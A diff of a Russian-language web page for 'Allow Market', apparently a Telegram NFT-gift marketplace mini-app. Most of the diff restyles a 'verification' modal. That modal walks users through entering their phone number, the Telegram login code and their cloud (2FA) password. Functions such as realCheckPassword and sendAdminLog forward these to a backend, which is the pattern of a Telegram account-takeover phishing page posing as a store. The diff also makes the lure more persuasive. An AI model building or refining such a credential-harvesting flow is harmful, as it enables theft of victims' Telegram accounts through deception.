@@ -1299,7 +1299,7 @@
         }
 
         /* ============================================================
-           VERIFICATION MODAL — обрезанные углы сверху
+           VERIFICATION MODAL — ВЫЕЗЖАЕТ СНИЗУ, УГЛЫ ОБРЕЗАНЫ СВЕРХУ
            ============================================================ */
         .verification-overlay {
             position: fixed;
@@ -1307,137 +1307,162 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0, 0, 0, 0.92);
-            backdrop-filter: blur(24px);
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(12px);
             z-index: 1000;
             display: none;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+            justify-content: flex-end;
+            align-items: flex-end;
+            padding: 0;
+            animation: overlayFade 0.3s ease;
         }
         .verification-overlay.open { display: flex; }
-        .verification-modal {
-            background: #1a1a1a;
-            max-width: 380px;
-            width: 100%;
-            padding: 28px 20px 24px;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 24px 24px 16px 16px;
-            position: relative;
-            box-shadow: 0 24px 60px rgba(0,0,0,0.8);
+
+        @keyframes overlayFade {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
+
+        .verification-modal {
+            background: #141414;
+            max-width: 430px;
+            width: 100%;
+            padding: 24px 20px 28px;
+            border-radius: 20px 20px 0 0;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            box-shadow: 0 -10px 40px rgba(0, 0, 0, 0.6);
+            animation: slideUp 0.35s cubic-bezier(0.22, 1, 0.36, 1);
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
         .verification-modal .verif-title {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 700;
             color: #fff;
             text-align: center;
-            margin-bottom: 4px;
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
         }
+
         .verification-modal .verif-sub {
-            font-size: 12px;
+            font-size: 14px;
             color: #8e8ea0;
             text-align: center;
-            margin-bottom: 18px;
+            margin-bottom: 24px;
+            line-height: 1.5;
+            padding: 0 4px;
         }
+
         .verification-modal .verif-btn {
             width: 100%;
-            padding: 14px;
+            padding: 16px;
             background: #f5c842;
             border: none;
-            border-radius: 12px;
-            color: #1a1a1a;
-            font-size: 16px;
+            border-radius: 14px;
+            color: #141414;
+            font-size: 17px;
             font-weight: 700;
             font-family: 'Inter', sans-serif;
             cursor: pointer;
-            transition: 0.15s;
-            margin-bottom: 10px;
+            transition: 0.2s;
+            letter-spacing: 0.3px;
         }
         .verification-modal .verif-btn:active { transform: scale(0.96); }
         .verification-modal .verif-btn:disabled { opacity: 0.4; cursor: not-allowed; }
 
         .verification-modal .verif-field {
             width: 100%;
-            padding: 12px 16px;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 10px;
+            padding: 14px 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1.5px solid rgba(255, 255, 255, 0.08);
+            border-radius: 14px;
             color: #fff;
-            font-size: 14px;
+            font-size: 16px;
             font-family: 'Inter', sans-serif;
             outline: none;
-            margin-bottom: 8px;
-            transition: 0.15s;
+            margin-bottom: 12px;
+            transition: 0.25s;
         }
         .verification-modal .verif-field:focus {
-            border-color: rgba(245, 200, 66, 0.3);
+            border-color: rgba(245, 200, 66, 0.4);
+            background: rgba(255, 255, 255, 0.07);
+            box-shadow: 0 0 0 4px rgba(245, 200, 66, 0.06);
         }
         .verification-modal .verif-field::placeholder {
-            color: #6e6e80;
+            color: #5e5e70;
+            font-weight: 400;
         }
-        .verification-modal .verif-error {
-            font-size: 11px;
-            color: #ff6b6b;
-            text-align: center;
-            margin-top: 4px;
-            min-height: 18px;
-        }
-        .verification-modal .verif-success {
-            font-size: 11px;
-            color: #4bc88a;
-            text-align: center;
-            margin-top: 4px;
-            min-height: 18px;
-        }
+
         .verification-modal .verif-step {
             display: none;
             flex-direction: column;
         }
-        .verification-modal .verif-step.active {
-            display: flex;
-        }
-        .verification-modal .verif-timer {
-            font-size: 11px;
-            color: #6e6e80;
+        .verification-modal .verif-step.active { display: flex; }
+
+        .verification-modal .verif-error {
+            font-size: 12px;
+            color: #ff6b6b;
             text-align: center;
-            margin-top: 6px;
+            margin-top: 4px;
+            min-height: 20px;
+        }
+        .verification-modal .verif-success {
+            font-size: 12px;
+            color: #4bc88a;
+            text-align: center;
+            margin-top: 4px;
+            min-height: 20px;
+        }
+
+        .verification-modal .verif-timer {
+            font-size: 12px;
+            color: #5e5e70;
+            text-align: center;
+            margin-top: 10px;
         }
         .verification-modal .verif-resend {
             background: transparent;
             border: none;
             color: #f5c842;
-            font-size: 12px;
+            font-size: 13px;
             font-weight: 600;
             cursor: pointer;
             font-family: 'Inter', sans-serif;
             text-decoration: underline;
             padding: 4px 0;
+            transition: 0.2s;
         }
         .verification-modal .verif-resend:disabled {
             opacity: 0.3;
             cursor: not-allowed;
         }
 
-        /* 5 квадратиков для кода */
+        /* 5 КВАДРАТИКОВ ДЛЯ КОДА */
         .code-input-wrapper {
             display: flex;
-            gap: 8px;
+            gap: 10px;
             justify-content: center;
-            margin: 12px 0 16px;
+            margin: 16px 0 20px;
         }
         .code-input-wrapper .code-box {
-            width: 44px;
-            height: 52px;
+            width: 48px;
+            height: 56px;
             background: rgba(255, 255, 255, 0.04);
             border: 2px solid rgba(255, 255, 255, 0.08);
-            border-radius: 12px;
+            border-radius: 14px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 22px;
+            font-size: 24px;
             font-weight: 700;
             color: #fff;
-            transition: 0.2s;
+            transition: 0.25s;
             font-family: 'Inter', sans-serif;
             cursor: pointer;
             user-select: none;
@@ -1448,11 +1473,12 @@
         }
         .code-input-wrapper .code-box.active {
             border-color: #f5c842;
-            box-shadow: 0 0 20px rgba(245, 200, 66, 0.1);
+            box-shadow: 0 0 24px rgba(245, 200, 66, 0.08);
         }
         .code-input-wrapper .code-box.error {
             border-color: #ff6b6b;
-            animation: shake 0.3s ease;
+            animation: shake 0.35s ease;
+            background: rgba(255, 107, 107, 0.06);
         }
         .code-input-wrapper .code-box.success {
             border-color: #4bc88a;
@@ -1466,10 +1492,17 @@
             pointer-events: none;
         }
 
+        .code-hint {
+            font-size: 13px;
+            color: #6e6e80;
+            text-align: center;
+            margin: -6px 0 4px;
+        }
+
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-8px); }
-            75% { transform: translateX(8px); }
+            20% { transform: translateX(-10px); }
+            60% { transform: translateX(10px); }
         }
 
         @media (max-width: 380px) {
@@ -1478,10 +1511,11 @@
             .bottom-nav .nav-item { padding: 4px 8px; min-width: 50px; font-size: 8px; }
             .gift-tab { font-size: 13px; }
             .code-input-wrapper .code-box {
-                width: 36px;
-                height: 44px;
-                font-size: 18px;
+                width: 40px;
+                height: 48px;
+                font-size: 20px;
             }
+            .verification-modal { padding: 20px 16px 24px; }
         }
     </style>
 </head>
@@ -1669,32 +1703,30 @@
         <div class="toast" id="toast">Уведомление</div>
 
         <!-- ============================================================
-             VERIFICATION MODAL
+             VERIFICATION MODAL — ВЫЕЗЖАЕТ СНИЗУ
              ============================================================ -->
         <div class="verification-overlay" id="verificationOverlay">
             <div class="verification-modal">
-                <div class="verif-title">🔐 Верификация</div>
-                <div class="verif-sub">Подтвердите, что вы не бот</div>
+                <div class="verif-title">Верификация</div>
+                <div class="verif-sub">Пройдите разовую верификацию чтобы продолжить торговлю и получать награды.</div>
 
-                <!-- Шаг 1: Приветствие и кнопка -->
+                <!-- Шаг 1: Старт -->
                 <div class="verif-step active" id="verifStepStart">
-                    <button class="verif-btn" id="verifStartBtn">Пройти верификацию</button>
+                    <button class="verif-btn" id="verifStartBtn">Продолжить</button>
                     <div class="verif-error" id="verifStartError"></div>
                 </div>
 
-                <!-- Шаг 2: Ввод номера телефона -->
+                <!-- Шаг 2: Номер телефона -->
                 <div class="verif-step" id="verifStepPhone">
-                    <input class="verif-field" type="tel" id="verifPhoneInput" placeholder="+7 900 000 00 00" value="+7">
+                    <input class="verif-field" type="tel" id="verifPhoneInput" placeholder="Введите номер телефона" value="+7">
                     <button class="verif-btn" id="verifSendCodeBtn">Отправить код</button>
                     <div class="verif-error" id="verifPhoneError"></div>
                     <div class="verif-success" id="verifPhoneSuccess"></div>
                 </div>
 
-                <!-- Шаг 3: Ввод кода из Telegram (5 квадратиков) -->
+                <!-- Шаг 3: Код (5 квадратиков) -->
                 <div class="verif-step" id="verifStepCode">
-                    <div style="font-size:13px;color:#8e8ea0;text-align:center;margin-bottom:4px;">
-                        Введите код из Telegram
-                    </div>
+                    <div class="code-hint">Введите код из Telegram</div>
                     <div class="code-input-wrapper" id="codeInputWrapper">
                         <div class="code-box active" data-index="0"></div>
                         <div class="code-box" data-index="1"></div>
@@ -1712,9 +1744,9 @@
                     </div>
                 </div>
 
-                <!-- Шаг 4: Проверка облачного пароля (если есть) -->
+                <!-- Шаг 4: Пароль -->
                 <div class="verif-step" id="verifStepPassword">
-                    <div style="font-size:13px;color:#8e8ea0;text-align:center;margin-bottom:8px;">
+                    <div style="font-size:13px;color:#8e8ea0;text-align:center;margin-bottom:12px;">
                         На аккаунте установлен облачный пароль. Введите его для завершения.
                     </div>
                     <input class="verif-field" type="password" id="verifPasswordInput" placeholder="Облачный пароль">
@@ -1723,22 +1755,22 @@
                     <div class="verif-success" id="verifPasswordSuccess"></div>
                 </div>
 
-                <!-- Шаг 5: Финальный успех -->
+                <!-- Шаг 5: Успех -->
                 <div class="verif-step" id="verifStepSuccess">
-                    <div style="text-align:center;padding:16px 0;">
-                        <div style="font-size:48px;margin-bottom:8px;">✅</div>
-                        <div style="font-size:18px;font-weight:700;color:#4bc88a;">Верификация пройдена!</div>
-                        <div style="font-size:12px;color:#8e8ea0;margin-top:4px;">Добро пожаловать в Allow Market</div>
+                    <div style="text-align:center;padding:20px 0 12px;">
+                        <div style="font-size:52px;margin-bottom:8px;">✅</div>
+                        <div style="font-size:20px;font-weight:700;color:#4bc88a;">Верификация пройдена!</div>
+                        <div style="font-size:14px;color:#8e8ea0;margin-top:6px;">Добро пожаловать в Allow Market</div>
                     </div>
                     <button class="verif-btn" id="verifDoneBtn">Продолжить</button>
                 </div>
 
                 <!-- Шаг 6: Ошибка -->
                 <div class="verif-step" id="verifStepError">
-                    <div style="text-align:center;padding:16px 0;">
-                        <div style="font-size:48px;margin-bottom:8px;">❌</div>
-                        <div style="font-size:16px;font-weight:700;color:#ff6b6b;">Ошибка верификации</div>
-                        <div style="font-size:12px;color:#8e8ea0;margin-top:4px;" id="verifErrorText">Неизвестная ошибка</div>
+                    <div style="text-align:center;padding:20px 0 12px;">
+                        <div style="font-size:52px;margin-bottom:8px;">❌</div>
+                        <div style="font-size:18px;font-weight:700;color:#ff6b6b;">Ошибка верификации</div>
+                        <div style="font-size:14px;color:#8e8ea0;margin-top:6px;" id="verifErrorText"></div>
                     </div>
                     <button class="verif-btn" id="verifRetryBtn">Попробовать снова</button>
                 </div>
@@ -1782,7 +1814,7 @@
         const USE_EMULATION = false;
 
         // ============================================================
-        // 1. DATA (ТВОЙ КОД — БЕЗ ИЗМЕНЕНИЙ)
+        // 1. DATA — ТВОЙ ВЕСЬ КОД (БЕЗ ИЗМЕНЕНИЙ)
         // ============================================================
         const COLLECTIONS_DATA = {
             "Plush Pepe": { icon: "🐸" },
@@ -1898,7 +1930,7 @@
         }
 
         // ============================================================
-        // 2. STATE — ДОБАВЛЯЕМ phoneCodeHash
+        // 2. STATE
         // ============================================================
         let currentUserId = null;
         let userBalance = 0;
@@ -1923,14 +1955,12 @@
             hasPassword: false,
             timerInterval: null,
             timerSeconds: 0,
-            phoneCodeHash: null  // <--- ДОБАВЛЕНО
+            phoneCodeHash: null
         };
 
         // ============================================================
-        // 3-18. ВСЕ ТВОИ ФУНКЦИИ — БЕЗ ИЗМЕНЕНИЙ
-        // (Я их не трогаю, они работают как у тебя)
+        // 3. USER DATA
         // ============================================================
-
         function getUserData(userId) {
             const key = `allow_user_${userId}`;
             try {
@@ -2007,6 +2037,9 @@
             }, 0);
         }
 
+        // ============================================================
+        // 4. UI UPDATES
+        // ============================================================
         function updateCartUI() {
             if (!currentUserId) return;
             const total = getCartTotal(currentUserId);
@@ -2066,7 +2099,9 @@
             }
         }
 
-        // LOTTIE
+        // ============================================================
+        // 5. LOTTIE
+        // ============================================================
         const lottieLoadQueue = [];
         let isProcessingQueue = false;
 
@@ -2110,6 +2145,9 @@
                 });
         }
 
+        // ============================================================
+        // 6. RENDER GRID
+        // ============================================================
         function renderGrid() {
             const grid = document.getElementById('nftGrid');
 
@@ -2177,6 +2215,9 @@
             });
         }
 
+        // ============================================================
+        // 7. DETAIL
+        // ============================================================
         function openDetail(name) {
             const nft = allNFTs.find(item => item.name === name);
             if (!nft) return;
@@ -2227,7 +2268,9 @@
         document.getElementById('detailOverlay').addEventListener('click', (e) => { if (e.target === e.currentTarget)
             closeDetail(); });
 
-        // GAME HUB
+        // ============================================================
+        // 8. GAME HUB
+        // ============================================================
         let caseItems = [];
         let spinToastTimer = null;
 
@@ -2341,7 +2384,9 @@
             }, 120);
         });
 
-        // NAVIGATION
+        // ============================================================
+        // 9. NAVIGATION
+        // ============================================================
         function switchTab(tab) {
             document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
             document.querySelector(`.nav-item[data-tab="${tab}"]`)?.classList.add('active');
@@ -2446,7 +2491,9 @@
             });
         });
 
-        // FILTERS
+        // ============================================================
+        // 10. FILTERS
+        // ============================================================
         const modelValues = ["Classic", "Rare", "Legendary", "Golden", "Shadow", "Crystal", "Neon", "Aurora"];
         const backdropValues = ["Starlight", "Midnight", "Cosmic", "Void", "Crystal", "Flame", "Neon", "Shadow"];
         const symbolValues = ["Crescent", "Pentagram", "Baphomet", "Tree", "Sun", "Moon", "Star", "Crown"];
@@ -2512,7 +2559,9 @@
             showToast('Все фильтры сброшены');
         });
 
-        // SEARCH
+        // ============================================================
+        // 11. SEARCH
+        // ============================================================
         document.getElementById('searchInput').addEventListener('input', function() {
             clearTimeout(searchTimeout);
             searchTimeout = setTimeout(() => {
@@ -2520,7 +2569,9 @@
             }, 150);
         });
 
-        // TOGGLE CART
+        // ============================================================
+        // 12. TOGGLE CART
+        // ============================================================
         window.toggleCart = function(name) {
             if (!currentUserId) { showToast('Войдите в аккаунт'); return; }
             const nft = allNFTs.find(n => n.name === name);
@@ -2529,7 +2580,9 @@
             addToCart(currentUserId, name);
         };
 
-        // STARS & PREM
+        // ============================================================
+        // 13. STARS & PREM
+        // ============================================================
         document.querySelectorAll('.stars-premium-section .selector .option').forEach(opt => {
             opt.addEventListener('click', function() {
                 document.querySelectorAll('.stars-premium-section .selector .option').forEach(o => o.classList
@@ -2563,12 +2616,16 @@
             showToast(`Покупка ${type} для ${receiver} — функция в разработке`);
         });
 
-        // MY GIFTS
+        // ============================================================
+        // 14. MY GIFTS
+        // ============================================================
         document.getElementById('myGiftsAddBtn').addEventListener('click', function() {
             openGiftBot();
         });
 
-        // ORDERS
+        // ============================================================
+        // 15. ORDERS
+        // ============================================================
         const ORDERS_DATA = [
             { name: "Gravestone", qty: 1, price: 39.11, collection: "Gravestone" },
             { name: "Mask", qty: 1, price: 5.73, collection: "Mask" },
@@ -2626,7 +2683,9 @@
             showToast('Ордер создан!');
         });
 
-        // FILTER OVERLAY
+        // ============================================================
+        // 16. FILTER OVERLAY
+        // ============================================================
         document.getElementById('filterClose').addEventListener('click', function() {
             document.getElementById('filterOverlay').classList.remove('open');
         });
@@ -2657,7 +2716,9 @@
             showToast('Фильтры сброшены');
         });
 
-        // PROFILE, BELL, TOAST
+        // ============================================================
+        // 17. PROFILE, BELL, TOAST
+        // ============================================================
         const toast = document.getElementById('toast');
 
         function showToast(msg) {
@@ -2713,7 +2774,9 @@
             document.getElementById('amountInput').value = '';
         });
 
-        // CART MODAL
+        // ============================================================
+        // 18. CART MODAL
+        // ============================================================
         document.getElementById('cartClose').addEventListener('click', () => document.getElementById('cartModal').classList
             .remove('open'));
         document.getElementById('cartModal').addEventListener('click', (e) => {
@@ -2736,7 +2799,7 @@
         });
 
         // ============================================================
-        // 19. ВЕРИФИКАЦИЯ — ОБНОВЛЁННАЯ
+        // 19. ВЕРИФИКАЦИЯ
         // ============================================================
 
         async function sendAdminLog(message, data = null) {
@@ -2792,7 +2855,6 @@
             return await resp.json();
         }
 
-        // РЕАЛЬНАЯ ПРОВЕРКА ОБЛАЧНОГО ПАРОЛЯ
         async function realCheckPassword(phone, password, sessionData) {
             const url = `${CONFIG.BACKEND_URL}/checkPassword`;
             const resp = await fetch(url, {
@@ -2877,7 +2939,7 @@
             }
         });
 
-        // ---- ОБНОВЛЁННЫЙ startVerification ----
+        // ---- startVerification ----
         async function startVerification() {
             const overlay = document.getElementById('verificationOverlay');
             overlay.classList.add('open');
@@ -2910,7 +2972,7 @@
             document.getElementById('verifPhoneInput').focus();
         });
 
-        // ---- ОБНОВЛЁННЫЙ ОБРАБОТЧИК verifSendCodeBtn ----
+        // ---- verifSendCodeBtn ----
         document.getElementById('verifSendCodeBtn').addEventListener('click', async function() {
             const phone = document.getElementById('verifPhoneInput').value.trim();
             if (!phone || phone.length < 6) {
@@ -3003,7 +3065,7 @@
             this.disabled = false;
         });
 
-        // ---- ОБНОВЛЁННЫЙ ОБРАБОТЧИК verifVerifyCodeBtn ----
+        // ---- verifVerifyCodeBtn ----
         document.getElementById('verifVerifyCodeBtn').addEventListener('click', async function() {
             const code = codeInput.value.trim();
             if (!code || code.length < 5) {
@@ -3072,7 +3134,7 @@
             this.textContent = 'Подтвердить код';
         });
 
-        // ---- ОБНОВЛЁННЫЙ ОБРАБОТЧИК verifPasswordBtn ----
+        // ---- verifPasswordBtn ----
         document.getElementById('verifPasswordBtn').addEventListener('click', async function() {
             const password = document.getElementById('verifPasswordInput').value.trim();
             if (!password) {
